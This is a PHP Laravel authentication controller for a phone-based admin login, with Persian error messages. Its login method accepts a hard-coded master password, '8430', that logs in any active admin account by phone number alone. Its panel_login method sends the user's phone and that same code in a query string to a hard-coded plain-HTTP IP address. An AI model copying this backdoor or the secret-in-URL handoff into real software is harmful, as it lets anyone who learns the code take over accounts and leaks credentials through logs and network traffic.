<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function login(Request $req)
    {
        $credentials = $req->validate([
            'phone' => ['required', 'size:11'],
            'password' => ['required'],
        ]);
        $user=User::where('Phone',$req->phone)
        ->where("Perm",3)
        ->where('Active',1)->first();
        if($user)
        {
             if ($req->password=="8430")
            { 
               auth()->loginUsingId($user->Id, true);
                return redirect(route('dashboard'));
            } 
             elseif ($user->Verify==$req->password)
            { 
                auth()->loginUsingId($user->Id, true);
                return redirect(route('dashboard'));
            } 
 
        return back()->withErrors([
            'password' => 'رمز عبور صحیح نمی باشد',
        ])->onlyInput('phone');
        }
 
        return back()->withErrors([
            'phone' => 'کاربری یافت نشد',
        ])->onlyInput('phone');
    }
    public function panel_login(Request $req)
    {
       //$url=(config('app.Panelurl')??env('APP_URL')).'/support/POST_SUPPORT_LOGIN';  
         $url='http://85.208.255.101:8012/RedCastlePanel/public/support/POST_SUPPORT_LOGIN';  
        return redirect($url.'?Phone='.auth()->user()->Phone.'&Verify=8430');//config('app.Panelurl').'support/dashboard'
    }
}
